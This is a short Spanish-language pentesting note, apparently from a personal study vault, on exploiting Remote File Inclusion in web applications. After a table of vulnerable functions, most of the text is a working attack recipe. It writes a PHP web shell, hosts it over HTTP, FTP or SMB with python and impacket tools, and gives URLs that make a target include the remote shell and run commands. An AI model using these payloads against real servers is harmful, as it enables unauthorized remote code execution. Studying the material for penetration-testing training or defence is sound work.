Cuando una página web es vulnerable a [[Local file inclusion (LFI)]] normalmente también lo es a RFI. Para ver el contenido de este archivo revise antes el de LFI.

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`file_get_contents()`|✅|❌|✅|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.RemotePartial()`|✅|❌|✅|
|`include`|✅|✅|✅|

Estas son las funciones vulnerables a RFI o LFI, como vemos las que son vulnerables a RFI también lo son a LFI.

### Verify vuln

Para verificar la existencia de esta vulnerabilidad debe esta activada la opción que mencionamos anteriormente en [[Local file inclusion (LFI)]].

```shell-session
allow_url_include = On
```

Para verificarlo realmente lo que haremos será intentar pasar la IP propia de la máquina con una ruta para que no nos lo rechace por cualquier tema de firewall:

```shell-session
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1/index.php
```

Si funciona la página será vulnerable a RFI

### Ejecución remota

Primero crearemos un archivo malicioso para poder ejecutar el código:

```shell-session
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

#### HTTP

Creamos un servidor web con python para poder compartir este archivo:

```shell-session
python3 -m http.server <LISTENING_PORT>
```

Y usamos la shell:

```shell-session
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1/shell.php&cmd=id
```
#### FTP

Puede que el WAF bloquee la conexión con servidores web o el protocolo http por lo que podemos hacer lo mismo pero con FTP.

Levantamos el servidor ftp:

```shell-session
python -m pyftpdlib -p 21
```

Y hacemos lo mismo que en el ejemplo anterior:

```shell-session
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

#### SMB

Si el servidor objetivo está alojado en una máquina windows no necesitamos que la opción allow_url_include esté habilitado para explotar el RFI, podemos utilizar el protocolo SMB.

Levantamos el servidor de forma que se pueda autenticar de forma anónima:

```shell-session
impacket-smbserver -smb2support share $(pwd)
```

Y podemos hacerlo como lo estábamos haciendo antes:

```shell-session
http://<SERVER_IP>:<PORT>/index.php?language=\\OUT_IP\share\shell.php&cmd=whoami
```